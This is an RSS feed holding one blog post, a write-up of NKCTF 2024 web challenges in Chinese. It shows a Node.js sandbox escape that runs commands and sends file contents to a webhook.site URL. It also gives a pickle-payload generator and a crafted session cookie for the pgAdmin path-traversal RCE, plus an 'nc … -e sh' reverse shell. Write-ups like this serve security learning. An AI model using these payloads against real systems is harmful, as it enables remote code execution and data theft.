<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>ililiiY • Posts by &#34;比赛&#34; tag</title>
        <link>https://lookhui.github.io</link>
        <description>坚持与努力</description>
        <language>zh-CN</language>
        <pubDate>Mon, 25 Mar 2024 09:26:11 +0800</pubDate>
        <lastBuildDate>Mon, 25 Mar 2024 09:26:11 +0800</lastBuildDate>
        <category>渗透</category>
        <category>WEB</category>
        <category>PWN</category>
        <category>HTB</category>
        <category>mobile</category>
        <category>比赛</category>
        <category>reverse</category>
        <category>CTF</category>
        <category>记录贴</category>
        <item>
            <guid isPermalink="true">https://lookhui.github.io/NKCTF%202024/</guid>
            <title>NKCTF</title>
            <link>https://lookhui.github.io/NKCTF%202024/</link>
            <category>比赛</category>
            <pubDate>Mon, 25 Mar 2024 09:26:11 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;nkctf-2024&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nkctf-2024&#34;&gt;#&lt;/a&gt; NKCTF 2024&lt;/h2&gt;
&lt;h3 id=&#34;web&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; web&lt;/h3&gt;
&lt;h4 id=&#34;my-first-cms&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#my-first-cms&#34;&gt;#&lt;/a&gt; my first cms&lt;/h4&gt;
&lt;p&gt;爆破密码进去直接命令执行得到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/04/26/KycNRPwgl7VuXT3.png&#34; alt=&#34;image-20240324155515773&#34; /&gt;&lt;/p&gt;
&lt;p&gt;参考链接&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/capture0x/CMSMadeSimple2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/capture0x/CMSMadeSimple&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;全世界最简单的ctf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全世界最简单的ctf&#34;&gt;#&lt;/a&gt; 全世界最简单的 CTF&lt;/h4&gt;
&lt;p&gt;使用 nodejs 的 fs 模块可以读取文件，我猜测文件位置是 app/app.js 查看到源码&lt;/p&gt;
&lt;p&gt;然后使用语句&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;throw new Proxy(&amp;#123;&amp;#125;, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    get: function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const cc = arguments.callee.caller;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const gg = (cc.constructor.constructor(`return $&amp;#123;`$&amp;#123;&amp;#x27;proces&amp;#x27;&amp;#125;s`&amp;#125;`))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const fs = gg.mainModule.require(&amp;#x27;fs&amp;#x27;).readFileSync(&amp;#x27;/app/app.js&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const p = (cc.constructor.constructor(&amp;#x27;return fetch&amp;#x27;))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      return p(&amp;quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&amp;quot;, &amp;#123;method: &amp;quot;POST&amp;quot;, body: JSON.stringify(&amp;#123;data: `$&amp;#123;fs&amp;#125;`&amp;#125;)&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;即可读取到 app/app.js&lt;/p&gt;
&lt;p&gt;他源码并没有过滤掉 fork 我们正好可以利用&lt;/p&gt;
&lt;p&gt;最终脚本&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// 文件写入suceess&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;throw new Proxy(&amp;#123;&amp;#125;, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    get: function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const cc = arguments.callee.caller;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const gg = (cc.constructor.constructor(`return $&amp;#123;`$&amp;#123;&amp;#x27;proces&amp;#x27;&amp;#125;s`&amp;#125;`))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;let content = `&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let cs = require(&amp;#x27;$&amp;#123;`$&amp;#123;&amp;#x27;child_p&amp;#x27;&amp;#125;rocess&amp;#x27;).exe`&amp;#125;cSync(&amp;#x27;/readflag&amp;#x27;).toString();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $&amp;#123;`$&amp;#123;&amp;#x27;proces&amp;#x27;&amp;#125;s`&amp;#125;.on(&amp;quot;message&amp;quot;,function(msg)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fetch(&amp;quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&amp;quot;, &amp;#123;method: &amp;quot;POST&amp;quot;, body: JSON.stringify(&amp;#123;data: cs&amp;#125;)&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      `;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const fs = gg.mainModule.require(&amp;#x27;fs&amp;#x27;).appendFileSync(&amp;quot;./readflag1.js&amp;quot;,content);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const p = (cc.constructor.constructor(&amp;#x27;return fetch&amp;#x27;))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      return p(&amp;quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&amp;quot;, &amp;#123;method: &amp;quot;POST&amp;quot;, body: JSON.stringify(&amp;#123;data: `$&amp;#123;fs&amp;#125;`&amp;#125;)&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//通信成功&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;throw new Proxy(&amp;#123;&amp;#125;, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    get: function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const cc = arguments.callee.caller;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const g = (cc.constructor.constructor(`return $&amp;#123;`$&amp;#123;&amp;#x27;proces&amp;#x27;&amp;#125;s`&amp;#125;`))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const h = g.mainModule.require(`$&amp;#123;&amp;#x27;child_p&amp;#x27;&amp;#125;rocess`).fork(&amp;#x27;./readflag1.js&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      h.send(&amp;#x27;hello&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      const p = (cc.constructor.constructor(&amp;#x27;return fetch&amp;#x27;))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      return p(&amp;quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&amp;quot;, &amp;#123;method: &amp;quot;POST&amp;quot;, body: JSON.stringify(&amp;#123;data: `$&amp;#123;h&amp;#125;`&amp;#125;)&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意过滤即可&lt;/p&gt;
&lt;h4 id=&#34;attack_tacooooo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#attack_tacooooo&#34;&gt;#&lt;/a&gt; attack_tacooooo&lt;/h4&gt;
&lt;p&gt;参考链接&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;脚本如下&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def produce_pickle_bytes(platform, cmd):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b = b&amp;#x27;\x80\x04\x95&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b += struct.pack(&amp;#x27;L&amp;#x27;, 22 + len(platform) + len(cmd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b += b&amp;#x27;\x8c&amp;#x27; + struct.pack(&amp;#x27;b&amp;#x27;, len(platform)) + platform.encode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b += b&amp;#x27;\x94\x8c\x06system\x94\x93\x94&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b += b&amp;#x27;\x8c&amp;#x27; + struct.pack(&amp;#x27;b&amp;#x27;, len(cmd)) + cmd.encode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b += b&amp;#x27;\x94\x85\x94R\x94.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if len(sys.argv) != 2:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        exit(f&amp;quot;usage: &amp;#123;sys.argv[0]&amp;#125; ip:port&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    with open(&amp;#x27;nt.pickle&amp;#x27;, &amp;#x27;wb&amp;#x27;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.write(produce_pickle_bytes(&amp;#x27;nt&amp;#x27;, f&amp;quot;mshta.exe http://&amp;#123;HOST&amp;#125;/&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    with open(&amp;#x27;posix.pickle&amp;#x27;, &amp;#x27;wb&amp;#x27;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.write(produce_pickle_bytes(&amp;#x27;posix&amp;#x27;, f&amp;quot;curl http://&amp;#123;HOST&amp;#125;/&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zbWJzZXJ2ZXItdTc1bm9vczg3dms0NGYucHk=&#34;&gt;还有一个 smbserver.py&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;首先要知道这个漏洞是因为 join 去合并拼接产生&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;此函数有两个缺点：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;它没有设置不应转义的受信任基路径，因此返回 。os.path.join(&amp;quot;/opt/safe/&amp;quot;, &amp;quot;../../etc/passwd&amp;quot;)/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;它在其参数中使用最右边的绝对路径作为根路径，因此返回 。os.path.join(&amp;quot;./safe/&amp;quot;, &amp;quot;do_not_escape_from_here&amp;quot;, &amp;quot;/etc/passwd&amp;quot;)/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;比赛题目环境是由 docker 容器搭建&lt;/p&gt;
&lt;p&gt;环境内无 curl 以及 bash&lt;/p&gt;
&lt;p&gt;但是有 nc 可以利用 nc 来达到反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc 8.137.131.159 9006 -e sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;并且下面是需要利用&lt;/p&gt;
&lt;p&gt;pga4_session 来构造反序列化&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /browser/ HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Pragma: no-cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: no-cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn/login?next=%2F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!baeac19e-2dcc-4d96-a4c7-1ff410ddd8c2!AZleysLS+ZnrL20IU1mGt6lHxXc3O8/It0JHyC4sJqA=; PGADMIN_LANGUAGE=en&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;构造如上，路径无所谓&lt;/p&gt;
&lt;p&gt;公网 ip 监听端口即可&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
